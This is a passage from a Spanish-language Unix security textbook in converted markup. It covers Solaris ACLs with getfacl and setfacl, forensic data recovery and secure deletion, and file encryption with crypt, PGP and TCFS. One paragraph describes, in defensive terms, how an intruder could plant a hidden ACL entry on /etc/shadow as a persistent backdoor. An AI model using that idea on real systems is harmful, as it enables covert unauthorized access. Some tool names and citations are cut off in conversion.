utilizado en Unix, las listas de control de acceso existen en Unix desde hace m&#x00E1;s de diez a~nos
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Los ejemplos que vamos a utilizar aqu&#x02CA;&#x0131; (&#x00F3;rdenes, resultados&#x2026;) se han realizado sobre Solaris; la
idea es la misma en el resto de Unices, aunque pueden cambiar las estructuras de las listas.
Para obtener una excelente visi&#x00F3;n de las ACLs es recomendable consultar <citation>[?]</citation>, y por supuesto
la documentaci&#x00F3;n de los diferentes clones de Unix para detalles concretos de cada manejo e
implementaci&#x00F3;n.
<!--br/-->
<!--br/-->La primera pregunta que nos debemos hacer sobre las listas de control de acceso es obvia: &#x00BF;c&#x00F3;mo las vemos?
Si habitualmente queremos saber si a un usuario se le permite cierto tipo de acceso sobre un &#xFB01;chero no
tenemos m&#x00E1;s que hacer un listado largo:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/usr/local/sbin/sshd
&#x00A0;-rwx------&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2616160&#x00A0;Apr&#x00A0;28&#x00A0;&#x00A0;1997&#x00A0;/usr/local/sbin/sshd
&#x00A0;anita:~#
</literallayout>
<!--l. 860--><para>Viendo el resultado, directamente sabemos que el &#xFB01;chero sshd puede ser ejecutado, modi&#xFB01;cado y le&#x02CA;&#x0131;do
por el administrador, pero por nadie m&#x00E1;s; sin embargo, no conocemos el estado de la lista de
control de acceso asociada al archivo. Para ver esta lista, en Solaris se ha de utilizar la orden
getfacl:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;getfacl&#x00A0;/usr/local/sbin/sshd
&#x00A0;
&#x00A0;#&#x00A0;file:&#x00A0;/usr/local/sbin/sshd
&#x00A0;#&#x00A0;owner:&#x00A0;root
&#x00A0;#&#x00A0;group:&#x00A0;bin
&#x00A0;user::rwx
&#x00A0;group::---&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#effective:---
&#x00A0;mask:---
&#x00A0;other:---
&#x00A0;anita:/#
</literallayout>
<!--l. 879--><para>Acabamos de visualizar una lista de control de acceso de Solaris; en primer lugar se nos indica el nombre del
&#xFB01;chero, su propietario y su grupo, todos precedidos por &#x2018;#&#x2019;. Lo que vemos a continuaci&#x00F3;n es la propia lista
de control: los campos user, group y other son b&#x00E1;sicamente la interpretaci&#x00F3;n que getfacl hace de los
permisos del &#xFB01;chero (si nos &#xFB01;jamos, coincide con el resultado del ls -l). El campo mask es muy similar al
umask cl&#x00E1;sico: de&#xFB01;ne los permisos m&#x00E1;ximos que un usuario (a excepci&#x00F3;n del propietario) o grupo
puede tener sobre el &#xFB01;chero. Finalmente, el campo effective nos dice, para cada usuario
(excepto el propietario) o grupo el efecto que la m&#x00E1;scara tiene sobre los permisos: es justamente
el campo que tenemos que analizar si queremos ver qui&#x00E9;n puede acceder al archivo y de qu&#x00E9;
forma.
<!--br/-->
<!--br/-->Sin embargo, hasta ahora no hemos observado nada nuevo; podemos &#xFB01;jarnos que la estructura de la lista
de control de acceso otorga los mismos permisos que las ternas cl&#x00E1;sicas. Esto es algo normal en todos los
Unix: si no indicamos lo contrario, al crear un &#xFB01;chero se le asocia una ACL que coincide con los permisos
que ese archivo tiene en el sistema (cada archivo tendr&#x00E1; una lista asociada, igual que tiene unos permisos);
de esta forma, el resultado anterior no es m&#x00E1;s que la visi&#x00F3;n que getfacl tiene de los bits rwx del &#xFB01;chero
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Lo interesante de cara a la protecci&#x00F3;n de &#xFB01;cheros es extender los permisos cl&#x00E1;sicos del archivo, modi&#xFB01;cando
su lista asociada. Esto lo podemos conseguir con la orden setfacl:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;setfacl&#x00A0;-m&#x00A0;user:toni:r-x&#x00A0;/usr/local/sbin/sshd
&#x00A0;anita:~#&#x00A0;getfacl&#x00A0;/usr/local/sbin/sshd
&#x00A0;
&#x00A0;#&#x00A0;file:&#x00A0;/usr/local/sbin/sshd
&#x00A0;#&#x00A0;owner:&#x00A0;root
&#x00A0;#&#x00A0;group:&#x00A0;bin
&#x00A0;user::rwx
&#x00A0;user:toni:r-x&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#effective:---
&#x00A0;group::---&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#effective:---
&#x00A0;mask:---
&#x00A0;other:---
&#x00A0;anita:~#
</literallayout>
<!--l. 918--><para>Como vemos, acabamos de modi&#xFB01;car la lista de control de acceso del archivo para asignarle a toni permiso
de ejecuci&#x00F3;n y lectura sobre el mismo. La orden setfacl se utiliza principalmente de tres formas: o bien
a~nadimos entradas a la ACL, mediante la opci&#x00F3;n -m seguida de las entradas que deseemos a~nadir separadas
por comas (lo que hemos hecho en este caso, aunque no se han utilizado comas porque s&#x00F3;lo hemos a~nadido
una entrada), o bien utilizamos el par&#x00E1;metro -s para reemplazar la ACL completa (hemos
de indicar todas las entradas, separadas tambi&#x00E9;n por comas), o bien borramos entradas de la
lista con la opci&#x00F3;n -d (de sintaxis similar a -m). Cada entrada de la ACL tiene el siguiente
formato:
</para><section role="center"><title/>
<!--l. 928--><para> tipo:UID<informalequation><graphic 
fileref="unixsec41x.gif"></graphic></informalequation>GID:permisos</para></section>
<!--l. 931--><para>El tipo indica a qui&#x00E9;n aplicar los permisos (por ejemplo, user para el propietario del archivo,
o mask para la m&#x00E1;scara), el UID indica el usuario al que queremos asociar la entrada (como
hemos visto, se puede utilizar tambi&#x00E9;n el login, y el GID hace lo mismo con el grupo (de la
misma forma, se puede especi&#xFB01;car su nombre simb&#x00F3;lico). Finalmente, el campo de permisos hace
referencia a los permisos a asignar, y puede ser especi&#xFB01;cado mediante s&#x02CA;&#x0131;mbolos rwx- o de forma
octal.
<!--br/-->
<!--br/-->Acabamos de indicar que el usuario toni tenga permiso de lectura y ejecuci&#x00F3;n en el archivo; no obstante, si
ahora este usuario intenta acceder al &#xFB01;chero en estos modos obtendr&#x00E1; un error:

     </para><literallayout role="verbatim">
&#x00A0;anita:/usr/local/sbin$&#x00A0;id
&#x00A0;uid=100(toni)&#x00A0;gid=10(staff)
&#x00A0;anita:/usr/local/sbin$&#x00A0;./sshd
&#x00A0;bash:&#x00A0;./sshd:&#x00A0;Permission&#x00A0;denied
&#x00A0;anita:/usr/local/sbin$
</literallayout>
<!--l. 950--><para>&#x00BF;Qu&#x00E9; ha sucedido? Nada anormal, simplemente est&#x00E1; actuando la m&#x00E1;scara sobre sus permisos (antes hemos dicho
que debemos &#xFB01;jarnos en el campo effective, y aqu&#x02CA;&#x0131; podemos comprobar que no se ha modi&#xFB01;cado). Para
solucionar esto hemos de modi&#xFB01;car el campo mask:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;setfacl&#x00A0;-m&#x00A0;mask:r-x&#x00A0;/usr/local/sbin/sshd
&#x00A0;anita:~#
</literallayout>
<!--l. 960--><para>Si ahora toni intenta acceder al &#xFB01;chero para leerlo o ejecutarlo, ya se le va a permitir:

     </para><literallayout role="verbatim">
&#x00A0;anita:/usr/local/sbin$&#x00A0;id
&#x00A0;uid=100(toni)&#x00A0;gid=10(staff)
&#x00A0;anita:/usr/local/sbin$&#x00A0;./sshd
&#x00A0;/etc/sshd&#x005F;config:&#x00A0;No&#x00A0;such&#x00A0;file&#x00A0;or&#x00A0;directory
&#x00A0;...
</literallayout>
<!--l. 971--><para>Aunque obtenga un error, este error ya no depende de la protecci&#x00F3;n de los &#xFB01;cheros sino de la con&#xFB01;guraci&#x00F3;n del
programa: el administrador obtendr&#x02CA;&#x0131;a el mismo error. No obstante, s&#x02CA;&#x0131; que hay diferencias entre una
ejecuci&#x00F3;n de toni y otra del root, pero tambi&#x00E9;n son impuestas por el resto del sistema operativo Unix: toni no
podr&#x02CA;&#x0131;a utilizar recursos a los que no le est&#x00E1; permitido el acceso, como puertos bien conocidos, otros &#xFB01;cheros,
o procesos que no le pertenezcan. Hay que recordar que aunque un usuario ejecute un archivo
perteneciente al root, si el &#xFB01;chero no est&#x00E1; setuidado los privilegios del usuario no cambian. Sucede lo
mismo que pasar&#x02CA;&#x0131;a si el usuario tuviera permiso de ejecuci&#x00F3;n normal sobre el &#xFB01;chero, pero &#x00E9;ste realizara
tareas privilegiadas: podr&#x02CA;&#x0131;a ejecutarlo, pero obtendr&#x02CA;&#x0131;a error al intentar violar la protecci&#x00F3;n del sistema
operativo.
<!--br/-->
<!--br/-->En Solaris, para indicar que una lista de control de acceso otorga permisos no re&#xFB02;ejados en los bits rwx se
situa un s&#x02CA;&#x0131;mbolo &#x2018;+&#x2019; a la derecha de los permisos en un listado largo:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ls&#x00A0;-l&#x00A0;/usr/local/sbin/sshd
&#x00A0;-rwx------+&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bin&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2616160&#x00A0;Apr&#x00A0;28&#x00A0;&#x00A0;1997&#x00A0;/usr/local/sbin/sshd
&#x00A0;anita:~#
</literallayout>
<!--l. 994--><para>Otra caracter&#x02CA;&#x0131;stica que tiene Solaris es la capacidad de leer las entradas de una lista de control de acceso
desde un &#xFB01;chero en lugar de indicarlas en la l&#x02CA;&#x0131;nea de &#x00F3;rdenes, mediante la opci&#x00F3;n -f de setfacl; el formato
de este &#xFB01;chero es justamente el resultado de getfacl, lo que nos permite copiar ACLs entre archivos de
una forma muy c&#x00F3;moda:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;getfacl&#x00A0;/usr/local/sbin/sshd&#x00A0;&#x003E;/tmp/fichero
&#x00A0;anita:~#&#x00A0;setfacl&#x00A0;-f&#x00A0;/tmp/fichero&#x00A0;/usr/local/sbin/demonio
&#x00A0;anita:~#&#x00A0;getfacl&#x00A0;/usr/local/sbin/demonio
&#x00A0;
&#x00A0;#&#x00A0;file:&#x00A0;/usr/local/sbin/demonio
&#x00A0;#&#x00A0;owner:&#x00A0;root
&#x00A0;#&#x00A0;group:&#x00A0;other
&#x00A0;user::rwx
&#x00A0;user:toni:r-x&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#effective:r-x
&#x00A0;group::---&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#effective:---
&#x00A0;mask:r-x
&#x00A0;other:---
&#x00A0;anita:~#
</literallayout>
<!--l. 1017--><para>Esto es equivalente a utilizar una tuber&#x02CA;&#x0131;a entre las dos &#x00F3;rdenes, lo que producir&#x02CA;&#x0131;a el mismo resultado:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;getfacl&#x00A0;/usr/local/sbin/sshd&#x00A0;|&#x00A0;setfacl&#x00A0;-f&#x00A0;-&#x00A0;/usr/local/sbin/demonio
</literallayout>
<!--l. 1024--><para>Antes de &#xFB01;nalizar este apartado dedicado a las listas de control de acceso, quiz&#x00E1;s sea conveniente comentar el
principal problema de estos mecanismos. Est&#x00E1; claro que las ACLs son de gran ayuda para el administrador
de sistemas Unix, tanto para incrementar la seguridad como para facilitar ciertas tareas; sin
embargo, es f&#x00E1;cil darse cuenta de que se pueden convertir en algo tambi&#x00E9;n de gran ayuda, pero para
un atacante que desee situar puertas traseras en las m&#x00E1;quinas. Imaginemos simplemente que
un usuario autorizado de nuestro sistema aprovecha el &#x00FA;ltimo bug de sendmail (realmente
nunca hay un &#x2018;&#x00FA;ltimo&#x2019;) para conseguir privilegios de administrador en una m&#x00E1;quina; cuando se ha
convertido en root modi&#xFB01;ca la lista de control de acceso asociada a /etc/shadow y crea una nueva
entrada que le da un permiso total a su login sobre este archivo. Una vez hecho esto, borra
todo el rastro y corre a avisarnos del nuevo problema de sendmail, problema que r&#x00E1;pidamente
solucionamos, le damos las gracias y nos olvidamos del asunto. &#x00BF;Nos olvidamos del asunto? Tenemos
un usuario que, aunque los bits rwx no lo indiquen, puede modi&#xFB01;car a su gusto un archivo
crucial para nuestra seguridad. Contra esto, poco podemos hacer; simplemente comprobar
frecuentemente los listados de todos los &#xFB01;cheros importantes (ahora entendemos por qu&#x00E9; aparece el
s&#x02CA;&#x0131;mbolo &#x2018;+&#x2019; junto a las ternas de permisos), y si encontramos que un &#xFB01;chero tiene una lista
de control que otorga permisos no re&#xFB02;ejados en los bits rwx, analizar dicha lista mediante
getfacl y veri&#xFB01;car que todo es correcto. Es muy recomendable programar un par de shellscripts
simples, que automaticen estos procesos y nos informen en caso de que algo sospechoso se
detecte.
  </para></section><!--end section--><!--l. 1050--><section 
role="section"><title><abbrev role="title-mark">4.7</abbrev><anchor 
   id="x1-590004.7"  ></anchor>Recuperaci&#x00F3;n de datos</title>
<!--l. 1052--><para>  La inform&#x00E1;tica forense es un campo que d&#x02CA;&#x0131;a a d&#x02CA;&#x0131;a toma importancia; de la misma forma que la medicina
forense es capaz de extraer informaci&#x00F3;n valiosa de un cad&#x00E1;ver, incluso mucho despu&#x00E9;s de haber muerto, la
inform&#x00E1;tica forense pretende extraer informaci&#x00F3;n de un &#x2018;cad&#x00E1;ver&#x2019; computerizado (por ejemplo, un sistema en
el que un intruso ha borrado sus huellas), tambi&#x00E9;n incluso mucho despu&#x00E9;s de haber &#x2018;muerto&#x2019; (esto es, haber
sido borrado). Aunque las t&#x00E9;cnicas de recuperaci&#x00F3;n de datos en Unix se aplican habitualmente
para potenciar la seguridad de un equipo (por ejemplo, como hemos dicho, para analizar el
alcance real de un acceso no autorizado), &#x00E9;stas mismas t&#x00E9;cnicas utilizadas por un atacante pueden
llegar a comprometer gravemente la seguridad del sistema: un intruso que haya conseguido
cierto nivel de privilegio puede recuperar, por ejemplo, el texto plano de un documento que un
usuario haya cifrado con PGP y posteriormente borrado &#x2013; almacenando &#x00FA;nicamente el documento
cifrado &#x2013;. Aunque esto no es tan trivial como en otros sistemas menos seguros (en los que
incluso se facilitan herramientas tipo undelete), parece claro que este tipo de actividades
constituyen una amenaza a la seguridad (principalmente a la privacidad) de cualquier sistema
Unix.
<!--br/-->
<!--br/-->En 1996, Peter Gutmann public&#x00F3; <citation>[?]</citation>, un excelente art&#x02CA;&#x0131;culo donde se demostr&#x00F3; que la recuperaci&#x00F3;n de datos de
memoria (esto incluye por supuesto la memoria secundaria) es posible con un equipamiento relativamente
barato, de entre 1000 y 2500 d&#x00F3;lares, incluso tras sobreescribir varias veces los datos a borrar. Hasta ese
momento casi todo el trabajo realizado en el campo de la destrucci&#x00F3;n &#x2018;segura&#x2019; de datos se habia
limitado a est&#x00E1;ndares de organismos de defensa estadounidenses (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). Como el propio
Gutmann explica, estos trabajos &#x2013; aparte de quedar anticuados &#x2013; no mostraban toda la realidad
sobre la destrucci&#x00F3;n y recuperaci&#x00F3;n de datos, sino que ofrec&#x02CA;&#x0131;an una informaci&#x00F3;n posiblemente
inexacta; de esta forma las agencias estadounidenses confund&#x02CA;&#x0131;an a la opini&#x00F3;n p&#x00FA;blica (y a los
servicios de pa&#x02CA;&#x0131;ses hostiles) asegurando as&#x02CA;&#x0131; el acceso de la propia agencia a la informaci&#x00F3;n, y al
mismo tiempo proteg&#x02CA;&#x0131;an sus propios datos mediante gu&#x02CA;&#x0131;as y est&#x00E1;ndares clasi&#xFB01;cados para uso
interno.
<!--br/-->
<!--br/-->El art&#x02CA;&#x0131;culo de Gutmann se puede considerar la base de la inform&#x00E1;tica forense actual, un campo

que como hemos dicho, d&#x02CA;&#x0131;a a d&#x02CA;&#x0131;a cobra importancia; centr&#x00E1;ndonos en la rama de este campo
relativa a Unix (se le suele denominar Unix Forensics) podemos encontrar herramientas para
realizar borrado seguro de datos, como srm (Secure rm), del grupo de hackers THC (The
Hacker&#x02CA;
</para><!--l. 1090--><para>  ); este software implementa un algoritmo de borrado seguro bas&#x00E1;ndose en <citation>[?]</citation>. Dicho algoritmo
efectua principalmente un procedimiento de sobreescritura casi 40 veces, haciendo un &#xFB02;ush de la
cach&#x00E9; de disco despu&#x00E9;s de cada una de ellas; adem&#x00E1;s trunca el &#xFB01;chero a borrar y lo renombra
aleatoriamente antes de efectuar el unlink(), de forma que para un potencial atacante sea m&#x00E1;s
dif&#x02CA;&#x0131;cil obtener cualquier informaci&#x00F3;n del archivo una vez borrado. srm se distribuye dentro de
un paquete software denominado secure-delete, donde tambi&#x00E9;n podemos encontrar otras
herramientas relacionadas con la eliminaci&#x00F3;n segura de datos: smem (borrado seguro de datos en
memoria principal), sfill (borrado seguro de datos en el espacion disponible de un disco) y
por &#x00FA;ltimo sswap (borrado seguro de datos en el &#x00E1;rea de swap de Linux); todos los algoritmos
utilizados en estos programas est&#x00E1;n basados en el art&#x02CA;&#x0131;culo de Gutmann del que antes hemos
hablado.
<!--br/-->
<!--br/-->Otra herramienta importante a la hora de hablar de Unix Forensics, pero esta vez desde el lado opuesto a
secure-delete &#x2013; esto es, desde el punto de vista de la recuperaci&#x00F3;n de datos &#x2013; es sin duda The
Coroner&#x02CA;
</para><!--l. 1108--><para>  , obra de dos reconocidos expertos en seguridad: Wietse Venema y Dan Farmer. En verano de 1999,
concretamente el 6 de agosto, en el IBM T.J. Watson Research Center de Nueva York estos dos expertos
dieron una clase sobre Unix Forensics, en la que mostraban c&#x00F3;mo extraer informaci&#x00F3;n de este sistema
operativo, no s&#x00F3;lo del sistema de &#xFB01;cheros, sino tambi&#x00E9;n de la red, el sistema de logs o los procesos que se
ejecutan en una m&#x00E1;quina. Lamentablemente, The Coroner&#x02CA;
</para><!--l. 1115--><para>  a&#x00FA;n no se encuentra disponible, pero es posible ojear lo que va a ser esta herramienta en las
transparencias de esta conferencia, disponibles en http://www.porcupine.org/forensics/, donde se
muestra todo lo que un exhaustivo an&#x00E1;lisis sobre Unix puede &#x2013; y tambi&#x00E9;n lo que no puede &#x2013;
conseguir.
<!--br/-->
<!--br/-->El an&#x00E1;lisis forense, especialmente la recuperaci&#x00F3;n de datos, es especialmente importante a la hora de analizar
los alcances de una intrusi&#x00F3;n a un equipo. En estas situaciones, es muy posible que el atacante modi&#xFB01;que
&#xFB01;cheros de log (cuando no los borra completamente), troyanize programas o ejecute procesos determinados:
es aqu&#x02CA;&#x0131; donde la persona encargada de retornar al sistema a la normalidad debe descon&#xFB01;ar de cuanto la
m&#x00E1;quina le diga, y recurrir al an&#x00E1;lisis forense para determinar el impacto real del ataque y devolver el
sistema a un correcto funcionamiento.
  </para></section><!--end section--><!--l. 1128--><section 
role="section"><title><abbrev role="title-mark">4.8</abbrev><anchor 
   id="x1-600004.8"  ></anchor>Almacenamiento seguro</title>
<!--l. 1129--><para>
  </para><!--l. 1129--><section 
role="subsection"><title><abbrev role="title-mark">4.8.1</abbrev><anchor 
   id="x1-610004.8.1"  ></anchor>La orden crypt(1)</title>
<!--l. 1130--><para>  La orden crypt permite cifrar y descifrar &#xFB01;cheros en diferentes sistemas Unix; si no recibe par&#x00E1;metros lee
los datos de la entrada est&#x00E1;ndar y los escribe en la salida est&#x00E1;ndar, por lo que seguramente habremos de
redirigir ambas a los nombres de &#xFB01;chero adecuados. Un ejemplo simple de su uso puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;$&#x00A0;crypt&#x00A0;&#x003C;fichero.txt&#x00A0;&#x003E;fichero.crypt
&#x00A0;Enter&#x00A0;key:
&#x00A0;$
</literallayout>
<!--l. 1144--><para>En el anterior ejemplo hemos cifrado utilizando crypt el archivo fichero.txt y guardado el resultado en
fichero.crypt; el original en texto claro se mantiene en nuestro directorio, por lo que si queremos evitar
que alguien lo lea deberemos borrarlo.
<!--br/-->
<!--br/-->Para descifrar un &#xFB01;chero cifrado mediante crypt (por ejemplo, el anterior) utilizamos la misma orden y la
misma clave:

     </para><literallayout role="verbatim">
&#x00A0;$&#x00A0;crypt&#x00A0;&#x003C;fichero.crypt&#x003E;salida.txt
&#x00A0;Enter&#x00A0;key:
&#x00A0;$
</literallayout>
<!--l. 1159--><para>El anterior comando ha descifrado fichero.crypt con la clave tecleada y guardado el resultado en el
archivo salida.txt, que coincidir&#x00E1; en contenido con el anterior fichero.txt.
<!--br/-->
<!--br/-->crypt no se debe utilizar nunca para cifrar informaci&#x00F3;n con&#xFB01;dencial; la seguridad del algoritmo
de cifra utilizado por esta orden es m&#x02CA;&#x0131;nima, ya que crypt se basa en una m&#x00E1;quina con un
rotor de 256 elementos similar en muchos aspectos a la alemana Enigma, con unos m&#x00E9;todos de
ataque r&#x00E1;pidos y conocidos por todos (<citation>[?]</citation>). Por si esto fuera poco, si en lugar de teclear la
clave cuando la orden nos lo solicita lo hacemos en l&#x02CA;&#x0131;nea de comandos, como en el siguiente
ejemplo:

     </para><literallayout role="verbatim">
&#x00A0;$&#x00A0;crypt&#x00A0;clave&#x00A0;&#x003C;&#x00A0;fichero.txt&#x00A0;&#x003E;&#x00A0;fichero.crypt
&#x00A0;$
</literallayout>
<!--l. 1177--><para>Entonces a la debilidad criptogr&#x00E1;&#xFB01;ca de crypt se une el hecho de que en muchos Unices cualquier usuario
puede observar la clave con una orden tan simple como ps (no obstante, para minimizar este
riesgo, el propio programa guarda la clave y la elimina de su l&#x02CA;&#x0131;nea de argumentos nada m&#x00E1;s
leerla).
<!--br/-->
<!--br/-->Obviamente, la orden crypt(1) no tiene nada que ver con la funci&#x00F3;n crypt(3), utilizada a la hora de cifrar
claves de usuarios, que est&#x00E1; basada en una variante del algoritmo DES y se puede considerar segura en la
mayor&#x02CA;&#x0131;a de entornos.
  </para></section><!--end subsection--><!--l. 1186--><section 
role="subsection"><title><abbrev role="title-mark">4.8.2</abbrev><anchor 
   id="x1-620004.8.2"  ></anchor>PGP: Pretty Good Privacy</title>
<!--l. 1187--><para>  El software PGP, desarrollado por el cript&#x00F3;logo estadounidense Phil Zimmermann (<citation>[?]</citation>,
<!--br/--><citation>[?]</citation>), es mundialmente conocido como sistema de &#xFB01;rma digital para correo electr&#x00F3;nico. Aparte
de esta funci&#x00F3;n, PGP permite tambi&#x00E9;n el cifrado de archivos de forma convencional mediante
criptograf&#x02CA;&#x0131;a sim&#x00E9;trica (<citation>[?]</citation>); esta faceta de PGP convierte a este programa en una excelente
herramienta para cifrar archivos que almacenamos en nuestro sistema; no es el mismo mecanismo
que el que se emplea para cifrar un &#xFB01;chero que vamos a enviar por correo, algo que hay que
hacer utilizando la clave p&#x00FA;blica del destinatario, sino que es un m&#x00E9;todo que no utiliza para
nada los anillos de PGP, los userID o el cifrado asim&#x00E9;trico. Para ello utilizamos la opci&#x00F3;n
-c <anchor 
   id="x1-62001f7"  ></anchor><footnote><para>   Los ejemplos se han realizado con PGP 2.6.3i, en versiones posteriores han cambiado la sintaxis y la forma de
trabajar.</para></footnote>
desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;pgp&#x00A0;-c&#x00A0;fichero.txt
&#x00A0;No&#x00A0;configuration&#x00A0;file&#x00A0;found.
&#x00A0;Pretty&#x00A0;Good&#x00A0;Privacy(tm)&#x00A0;2.6.3i&#x00A0;-&#x00A0;Public-key&#x00A0;encryption&#x00A0;for&#x00A0;the&#x00A0;masses.
&#x00A0;(c)&#x00A0;1990-96&#x00A0;Philip&#x00A0;Zimmermann,&#x00A0;Phil&#x2019;s&#x00A0;Pretty&#x00A0;Good&#x00A0;Software.&#x00A0;1996-01-18
&#x00A0;International&#x00A0;version&#x00A0;-&#x00A0;not&#x00A0;for&#x00A0;use&#x00A0;in&#x00A0;the&#x00A0;USA.&#x00A0;Does&#x00A0;not&#x00A0;use&#x00A0;RSAREF.
&#x00A0;Current&#x00A0;time:&#x00A0;2000/03/02&#x00A0;07:18&#x00A0;GMT
&#x00A0;
&#x00A0;You&#x00A0;need&#x00A0;a&#x00A0;pass&#x00A0;phrase&#x00A0;to&#x00A0;encrypt&#x00A0;the&#x00A0;file.
&#x00A0;Enter&#x00A0;pass&#x00A0;phrase:
&#x00A0;Enter&#x00A0;same&#x00A0;pass&#x00A0;phrase&#x00A0;again:
&#x00A0;Preparing&#x00A0;random&#x00A0;session&#x00A0;key...Just&#x00A0;a&#x00A0;moment....
&#x00A0;Ciphertext&#x00A0;file:&#x00A0;fichero.txt.pgp
&#x00A0;anita:~$
</literallayout>
<!--l. 1218--><para>Esta orden nos preguntar&#x00E1; una clave para cifrar, una pass phrase, que no tiene por qu&#x00E9; ser (ni es recomendable
que lo sea) la misma que utilizamos para proteger la clave privada, utilizada en el sistema de &#xFB01;rma digital.
A partir de la clave tecleada (que obviamente no se muestra en pantalla), PGP generar&#x00E1; un archivo
denominado fichero.txt.pgp cuyo contenido es el resultado de comprimir y cifrar (en este orden) el
archivo original. Obviamente, fichero.txt no se elimina autom&#x00E1;ticamente, por lo que es probable que
deseemos borrarlo a mano.
<!--br/-->
<!--br/-->Si lo que queremos es obtener el texto en claro de un archivo previamente cifrado simplemente hemos de
pasar como par&#x00E1;metro el nombre de dicho &#xFB01;chero:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;pgp&#x00A0;fichero.txt.pgp
&#x00A0;No&#x00A0;configuration&#x00A0;file&#x00A0;found.
&#x00A0;Pretty&#x00A0;Good&#x00A0;Privacy(tm)&#x00A0;2.6.3i&#x00A0;-&#x00A0;Public-key&#x00A0;encryption&#x00A0;for&#x00A0;the&#x00A0;masses.
&#x00A0;(c)&#x00A0;1990-96&#x00A0;Philip&#x00A0;Zimmermann,&#x00A0;Phil&#x2019;s&#x00A0;Pretty&#x00A0;Good&#x00A0;Software.&#x00A0;1996-01-18
&#x00A0;International&#x00A0;version&#x00A0;-&#x00A0;not&#x00A0;for&#x00A0;use&#x00A0;in&#x00A0;the&#x00A0;USA.&#x00A0;Does&#x00A0;not&#x00A0;use&#x00A0;RSAREF.
&#x00A0;Current&#x00A0;time:&#x00A0;2000/03/02&#x00A0;07:24&#x00A0;GMT
&#x00A0;
&#x00A0;File&#x00A0;is&#x00A0;conventionally&#x00A0;encrypted.
&#x00A0;You&#x00A0;need&#x00A0;a&#x00A0;pass&#x00A0;phrase&#x00A0;to&#x00A0;decrypt&#x00A0;this&#x00A0;file.
&#x00A0;Enter&#x00A0;pass&#x00A0;phrase:
&#x00A0;Just&#x00A0;a&#x00A0;moment....Pass&#x00A0;phrase&#x00A0;appears&#x00A0;good.&#x00A0;.
&#x00A0;Plaintext&#x00A0;filename:&#x00A0;fichero.txt
&#x00A0;anita:~$
</literallayout>
<!--l. 1245--><para>Como vemos, se nos pregunta la clave que hab&#x02CA;&#x0131;amos utilizado para cifrar el archivo, y si es correcta se crea el
&#xFB01;chero con el texto en claro; como suced&#x02CA;&#x0131;a antes, el archivo original no se elimina, por lo que tendremos
ambos en nuestro directorio.
<!--br/-->
<!--br/-->PGP ofrece un nivel de seguridad much&#x02CA;&#x0131;simo superior al de crypt(1), ya que utiliza algoritmos de cifra
m&#x00E1;s robustos: en lugar de implementar un modelo similar a Enigma, basado en m&#x00E1;quinas de rotor, PGP
ofrece cifrado sim&#x00E9;trico principalmente mediante IDEA, un algoritmo de clave secreta desarrollado a &#xFB01;nales
de los ochenta por Xuejia Lai y James Massey. Aparte de IDEA, en versiones posteriores a la
utilizada aqu&#x02CA;&#x0131; se ofrecen tambi&#x00E9;n Triple DES (similar a DES pero con una longitud de clave
mayor) y CAST5, un algoritmo canadiense que hasta la fecha s&#x00F3;lo ha podido ser atacado con
&#x00E9;xito mediante fuerza bruta; este &#x00FA;ltimo es el cifrador sim&#x00E9;trico utilizado por defecto en PGP
5.x.
  </para></section><!--end subsection--><!--l. 1259--><section 
role="subsection"><title><abbrev role="title-mark">4.8.3</abbrev><anchor 
   id="x1-630004.8.3"  ></anchor>TCFS: Transparent Cryptographic File System</title>
<!--l. 1260--><para>  TCFS es un software desarrollado en la Universidad de Salerno y disponible para sistemas Linux que
proporciona una soluci&#x00F3;n al problema de la privacidad en sistemas de &#xFB01;cheros distribuidos como NFS:
t&#x02CA;&#x0131;picamente en estos entornos las comunicaciones se realizan en texto claro, con la enorme amenaza a la
seguridad que esto implica. TCFS almacena los &#xFB01;cheros cifrados, y son pasados a texto claro antes de ser
le&#x02CA;&#x0131;dos; todo el proceso se realiza en la m&#x00E1;quina cliente, por lo que las claves nunca son enviadas a trav&#x00E9;s de
la red.
<!--br/-->
<!--br/-->La principal diferencia de TCFS con respecto a otros sistemas de &#xFB01;cheros cifrados como CFS es que,
mientras que &#x00E9;stos operan a nivel de aplicaci&#x00F3;n, TCFS lo hace a nivel de n&#x00FA;cleo, consiguiendo as&#x02CA;&#x0131; una mayor
transparencia y seguridad. Obviamente esto tiene un grave inconveniente: TCFS s&#x00F3;lo est&#x00E1; dise~nado para
funcionar dentro del n&#x00FA;cleo de sistemas Linux, por lo que si nuestra red de Unix utiliza otro clon del
